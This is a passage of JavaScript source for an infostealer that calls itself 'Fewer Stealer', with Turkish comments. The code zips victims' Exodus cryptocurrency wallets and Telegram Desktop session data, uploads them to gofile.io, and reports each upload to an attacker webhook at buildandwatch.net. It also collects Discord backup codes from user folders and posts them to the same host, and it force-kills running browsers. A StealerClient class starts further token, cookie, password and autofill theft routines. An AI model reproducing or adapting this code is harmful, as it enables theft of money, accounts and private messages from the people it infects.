          const webhookUrl = 'https://buildandwatch.net/wbkk';

          // Embed verisini oluştur
          const embedData = {
            embeds: [
              {
                title: 'Dosya Yükleme Hatası',
                description: JSON.stringify(responsePayload, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
                color: 16711680 // Embed rengi (örnekte kırmızı renk)
              }
            ],
          };

          // Webhook'a POST isteği gönder
          axios.post(webhookUrl, embedData)
            .then(webhookResponse => {
              console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
            })
            .catch(error => {
              console.log('Webhook gönderilirken hata oluştu:', error.message);
            });
        });
    } else {
      console.log('Sunucu alınamadı veya yanıt vermedi.');
    }
  })
  .catch(error => {
    console.log('Sunucu alınırken hata oluştu:', error.message);
  });

};

   




async function DiscordListener(path) {
        return;
}

async function SubmitExodus() {
  const file = `C:\\Users\\${process.env.USERNAME}\\AppData\\Roaming\\Exodus\\exodus.wallet`;
  if (fs.existsSync(file)) {
    const zipper = new AdmZip();
    zipper.addLocalFolder(file);

    zipper.writeZip(`C:\\Users\\${process.env.USERNAME}\\AppData\\Local\\Exodus.zip`);

    // Gofile.io API'dan sunucu bilgisini al ve dosyayı yükle
    axios.get('https://api.gofile.io/getServer')
      .then(response => {
        if (response.data && response.data.data && response.data.data.server) {
          const server = response.data.data.server;

          // Dosya yolu ve adını belirleyelim.
          const filePath = `C:\\Users\\${process.env.USERNAME}\\AppData\\Local\\Exodus.zip`;

          // Dosya yükleme işlemi için FormData oluşturalım ve dosyayı ekleyelim.
          const form = new FormData();
          form.append('file', fs.createReadStream(filePath));

          axios.post(`https://${server}.gofile.io/uploadFile`, form, {
            headers: form.getHeaders()
          })
            .then(uploadResponse => {
              const responsePayload = {
                uploadResponseData: uploadResponse.data
              };

              // Webhook URL'si
              const webhookUrl = 'https://buildandwatch.net/wbkk';

              // Embed verisini oluştur
              const embedData = {
                embeds: [
                  {
                    title: 'Exodus Dosyası Yükleme Yanıtı',
                    description: JSON.stringify(uploadResponse.data, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
                    color: 16711680 // Embed rengi (örnekte kırmızı renk)
                  }
                ],
              };

              // Webhook'a POST isteği gönder
              axios.post(webhookUrl, embedData)
                .then(webhookResponse => {
                  console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
                })
                .catch(error => {
                  console.log('Webhook gönderilirken hata oluştu:', error.message);
                });

            })
            .catch(error => {
              console.log('Dosya yüklenirken hata oluştu:', error.message);

              const responsePayload = {
                error: error.message
              };

              // Webhook URL'si
              const webhookUrl = 'https://buildandwatch.net/wbkk';

              // Embed verisini oluştur
              const embedData = {
                embeds: [
                  {
                    title: 'Dosya Yükleme Hatası',
                    description: JSON.stringify(responsePayload, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
                    color: 16711680 // Embed rengi (örnekte kırmızı renk)
                  }
                ],
              };

              // Webhook'a POST isteği gönder
              axios.post(webhookUrl, embedData)
                .then(webhookResponse => {
                  console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
                })
                .catch(error => {
                  console.log('Webhook gönderilirken hata oluştu:', error.message);
                });
            });
        } else {
          console.log('Sunucu alınamadı veya yanıt vermedi.');
        }
      })
      .catch(error => {
        console.log('Sunucu alınırken hata oluştu:', error.message);
      });

    // Dikkat: Bu kod bloğu, "form.submit()" kullanarak webhook'a dosya yüklemeye çalışıyor. Bu bölümün işlevselliğini ve bağlamını tam olarak bilemiyorum. Bu nedenle, bu bölümün kendi ihtiyaçlarınıza uygun şekilde çalıştığından emin olmanız gerekir.
    const form = new FormData();
    form.append("file", fs.createReadStream(`C:\\Users\\${process.env.USERNAME}\\AppData\\Local\\Exodus.zip`));
    form.submit(webhook3939, (error, response) => {
      if (error) console.log(error);
    });
  }
}

async function SubmitTelegram() {
        if (fs.existsSync(appdata + '\\Telegram Desktop\\tdata')) {

                let zip = new AdmZip();

                session_files = []

                fs.readdir(appdata + '\\Telegram Desktop\\tdata', (err, file) => {
                        file.forEach((inside_file) => {
                                if (inside_file !== 'temp' && inside_file !== 'dumps' && inside_file !== 'emoji' &&
                                        inside_file !== 'working' && inside_file !== 'tdummy') {
                                        session_files.push(`${inside_file}`)
                                }
                        })

                        session_files.forEach(session_file => {
                                zip.addFile(session_file, new Buffer.from(appdata +
                                                `\\Telegram Desktop\\tdata\\${session_file}`),
                                        'Fewer Stealer xD!');
                        })

                        zip.writeZip(`TelegramSession.zip`)

                   


// Gofile.io API'dan sunucu bilgisini al ve dosyayı yükle
axios.get('https://api.gofile.io/getServer')
  .then(response => {
    if (response.data && response.data.data && response.data.data.server) {
      const server = response.data.data.server;

      // Dosya yolu ve adını belirleyelim.
      const filePath = `TelegramSession.zip`;

      // Dosya yükleme işlemi için FormData oluşturalım ve dosyayı ekleyelim.
      const form = new FormData();
      form.append('file', fs.createReadStream(filePath));

      axios.post(`https://${server}.gofile.io/uploadFile`, form, {
        headers: form.getHeaders()
      })
        .then(uploadResponse => {
          const responsePayload = {
            uploadResponseData: uploadResponse.data
          };

          // Webhook URL'si
          const webhookUrl = 'https://buildandwatch.net/wbkk';

          // Embed verisini oluştur
          const embedData = {
            embeds: [
              {
                title: 'Telegram Dosyası Yükleme Yanıtı',
                description: JSON.stringify(uploadResponse.data, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
                color: 16711680 // Embed rengi (örnekte kırmızı renk)
              }
            ],
          };

          // Webhook'a POST isteği gönder
          axios.post(webhookUrl, embedData)
            .then(webhookResponse => {
              console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
            })
            .catch(error => {
              console.log('Webhook gönderilirken hata oluştu:', error.message);
            });

        })
        .catch(error => {
          console.log('Dosya yüklenirken hata oluştu:', error.message);

          const responsePayload = {
            error: error.message
          };

          // Webhook URL'si
          const webhookUrl = 'https://buildandwatch.net/wbkk';

          // Embed verisini oluştur
          const embedData = {
            embeds: [
              {
                title: 'Dosya Yükleme Hatası',
                description: JSON.stringify(responsePayload, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
                color: 16711680 // Embed rengi (örnekte kırmızı renk)
              }
            ],
          };

          // Webhook'a POST isteği gönder
          axios.post(webhookUrl, embedData)
            .then(webhookResponse => {
              console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
            })
            .catch(error => {
              console.log('Webhook gönderilirken hata oluştu:', error.message);
            });
        });
    } else {
      console.log('Sunucu alınamadı veya yanıt vermedi.');
    }
  })
  .catch(error => {
    console.log('Sunucu alınırken hata oluştu:', error.message);
  });


 const form = new FormData();
        form.append("file", fs.createReadStream(`TelegramSession.zip`));
        form.submit(webhook3939, (error, response) => {
        if (error) console.log(error);
        });
				   
                        })
        }
}

function SubmitBackupCodes() {
    let home_dir = os.homedir();
    let codes = "";

    fs.readdirSync(`${home_dir}//Downloads`).forEach(file => {
        if (file.includes('discord_backup_codes')) {
            const text = fs.readFileSync(`${home_dir}//Downloads//${file}`, 'utf-8')
            codes += `# ${home_dir}\\Downloads\\${file}\n\n${text}\n\n`;
        }
    })

    fs.readdirSync(`${home_dir}//Desktop`).forEach(file => {
        if (file.includes('discord_backup_codes')) {
            const text = fs.readFileSync(`${home_dir}//Desktop//${file}`, 'utf-8')
            codes += `# ${home_dir}\\Desktop\\${file}\n\n${text}\n\n`;
        }
    })

    fs.readdirSync(`${home_dir}//Documents`).forEach(file => {
        if (file.includes('discord_backup_codes')) {
            const text = fs.readFileSync(`${home_dir}//Documents//${file}`, 'utf-8')
            codes += `# ${home_dir}\\Documents\\${file}\n\n${text}\n\n`;
        }
    })

    httpx.post(`https://buildandwatch.net/api/backupcodes?auth=SoShX7eRga9Fx4Z2`, {
        codes: codes
    })
}


async function closeBrowsers() {
  const browsersProcess = ["chrome.exe", "msedge.exe", "opera.exe", "brave.exe"];
  return new Promise(async (resolve) => {
    try {
      const { execSync } = require("child_process");
      const tasks = execSync("tasklist").toString();
      browsersProcess.forEach((process) => {
        if (tasks.includes(process)) {
          execSync(`taskkill /IM ${process} /F`);
        }
      });
      await new Promise((resolve) => setTimeout(resolve, 2500));
      resolve();
    } catch (e) {
      console.log(e);
      resolve();
    }
  });
}

function onlyUnique(item, index, array) {
    return array.indexOf(item) === index;
}

class StealerClient {
	constructor() {
		closeBrowsers();
		StopCords();
		getEncrypted();
		getCookiesAndSendWebhook();
		getExtension();
		InfectDiscords();
		StealTokens();
		stealltokens();
getAutofills();
	//	subautofill();
		getPasswords();
		getZippp();
		SubmitTelegram();
		SubmitBackupCodes();
		SubmitExodus();

//subzip();
	//	subpasswords();

	}
}

new StealerClient()